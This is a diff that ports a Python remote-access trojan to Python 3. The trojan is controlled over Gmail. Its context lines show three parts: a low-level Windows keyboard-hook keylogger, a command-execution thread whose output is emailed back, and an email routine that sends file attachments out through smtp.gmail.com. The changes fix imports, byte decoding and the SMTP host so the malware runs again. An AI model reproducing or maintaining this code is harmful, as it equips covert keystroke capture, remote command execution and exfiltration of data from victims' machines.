@@ -18,10 +18,10 @@ import json
 #from traceback import print_exc, format_exc
 from base64 import b64decode
 from smtplib import SMTP
-from email.MIMEMultipart import MIMEMultipart
-from email.MIMEBase import MIMEBase
-from email.MIMEText import MIMEText
-from email import Encoders
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email.mime.text import MIMEText
+from email import encoders
 from struct import pack
 from zlib import compress, crc32
 from ctypes import c_void_p, c_int, create_string_buffer, sizeof, windll, Structure, POINTER, WINFUNCTYPE, CFUNCTYPE, POINTER
@@ -284,7 +284,7 @@ class msgparser:
         self.getDateHeader(msg_data)
 
     def getPayloads(self, msg_data):
-        for payload in email.message_from_string(msg_data[1][0][1]).get_payload():
+        for payload in email.message_from_string(msg_data[1][0][1].decode("utf-8")).get_payload():
             if payload.get_content_maintype() == 'text':
                 self.text = payload.get_payload()
                 self.dict = json.loads(payload.get_payload())
@@ -293,10 +293,10 @@ class msgparser:
                 self.attachment = payload.get_payload()
 
     def getSubjectHeader(self, msg_data):
-        self.subject = email.message_from_string(msg_data[1][0][1])['Subject']
+        self.subject = email.message_from_string(msg_data[1][0][1].decode("utf-8"))['Subject']
 
     def getDateHeader(self, msg_data):
-        self.date = email.message_from_string(msg_data[1][0][1])['Date']
+        self.date = email.message_from_string(msg_data[1][0][1].decode("utf-8"))['Date']
 
 class keylogger(threading.Thread):
     #Stolen from http://earnestwish.com/2015/06/09/python-keyboard-hooking/                                                          
@@ -310,10 +310,10 @@ class keylogger(threading.Thread):
         self.keys = ''
         self.start()
 
-    def installHookProc(self, pointer):                                           
+    def installHookProc(self, ptr):                                           
         self.hooked = ctypes.windll.user32.SetWindowsHookExA( 
                         WH_KEYBOARD_LL, 
-                        pointer, 
+                        ptr, 
                         windll.kernel32.GetModuleHandleW(None), 
                         0
         )
@@ -353,9 +353,10 @@ class keylogger(threading.Thread):
          ctypes.windll.user32.GetMessageA(ctypes.byref(msg),0,0,0)
 
     def run(self):                                 
-        pointer = self.getFPTR(self.hookProc)
+        ptr = self.getFPTR(self.hookProc)
 
-        if self.installHookProc(pointer):
+        if self.installHookProc(ptr):
+            print("We in here!")
             sendEmail({'cmd': 'keylogger', 'res': 'Keylogger started'}, self.jobid)
             self.startKeyLog()
 
@@ -466,8 +467,9 @@ class execCmd(threading.Thread):
             stdout_value = proc.stdout.read()
             stdout_value += proc.stderr.read()
 
-            sendEmail({'cmd': self.command, 'res': stdout_value}, jobid=self.jobid)
+            sendEmail({'cmd': self.command, 'res': stdout_value.decode("utf-8")}, jobid=self.jobid)
         except Exception as e:
+            #print(e)
             #if verbose == True: print_exc()
             pass
 
@@ -531,13 +533,13 @@ class sendEmail(threading.Thread):
             if os.path.exists(attach) == True:
                 part = MIMEBase('application', 'octet-stream')
                 part.set_payload(open(attach, 'rb').read())
-                Encoders.encode_base64(part)
+                encoders.encode_base64(part)
                 part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(os.path.basename(attach)))
                 msg.attach(part)
 
         while True:
             try:
-                mailServer = SMTP()
+                mailServer = SMTP("smtp.gmail.com")
                 mailServer.connect(server, server_port)
                 mailServer.starttls()
                 mailServer.login(gmail_user,gmail_pwd)
